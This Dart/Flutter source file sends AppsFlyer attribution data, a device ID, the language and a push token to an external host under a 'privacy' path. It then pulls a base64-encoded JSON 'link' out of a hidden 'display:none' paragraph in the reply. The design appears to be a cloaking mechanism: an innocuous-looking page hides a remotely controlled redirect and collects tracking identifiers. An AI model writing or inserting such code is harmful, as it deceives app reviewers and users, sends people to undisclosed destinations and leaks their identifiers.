import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;

import 'appsflyer_service.dart';

class LinkResponse {
  const LinkResponse({required this.link, this.naming, this.firstLink = false});

  final String link;
  final String? naming;
  final bool firstLink;
}

const _baseUrl = 'https://opijkenbhn.lol/privacy';

Future<LinkResponse?> getLinkFromServer({
  required String asLng,
  String asTok = 'no_apns_token',
}) async {
  try {
    final asData = await AppsflyerService.buildAsData();
    final asId = await AppsflyerService.getAppsFlyerUID();

    final vars = {
      'asData': asData,
      'asId': asId,
      'asLng': asLng,
      'asTok': asTok,
    };
    final varsJson = jsonEncode(vars);
    final uri = Uri.parse('$_baseUrl/?vars=$varsJson');
    final response = await http
        .get(uri)
        .timeout(
          const Duration(seconds: 15),
          onTimeout: () => throw Exception('Timeout'),
        );

    final body = response.body;
    if (kDebugMode) {
      print('[ServerLink] Status: ${response.statusCode}');
      final bodyPreview = body.length > 1500
          ? '${body.substring(0, 1500)}...'
          : body;
      print('[ServerLink] Body: $bodyPreview');
    }
    if (body.trim() == '404') return null;

    final pattern =
        '<p[^>]*style\\s*=\\s*["\'][^"\']*display\\s*:\\s*none[^"\']*["\'][^>]*>([^<]*)</p>';
    final pMatch = RegExp(
      pattern,
      caseSensitive: false,
      dotAll: true,
    ).firstMatch(body);

    final base64Content = pMatch?.group(1)?.trim();
    if (base64Content == null || base64Content.isEmpty) return null;

    final decoded = utf8.decode(base64Decode(base64Content));
    final json = jsonDecode(decoded) as Map<String, dynamic>?;
    if (json == null) return null;

    final firstLink = json['firstLink'] == true || json['first_link'] == true;
    if (kDebugMode) {
      print(
        '[ServerLink] Parsed: link=${json['link']}, naming=${json['naming']}, firstLink=$firstLink',
      );
    }

    final link = json['link'] as String?;
    if (link == null || link.isEmpty) return null;

    return LinkResponse(
      link: link,
      naming: json['naming'] as String?,
      firstLink: firstLink,
    );
  } catch (e) {
    if (kDebugMode) print('[ServerLink] Error: $e');
    return null;
  }
}
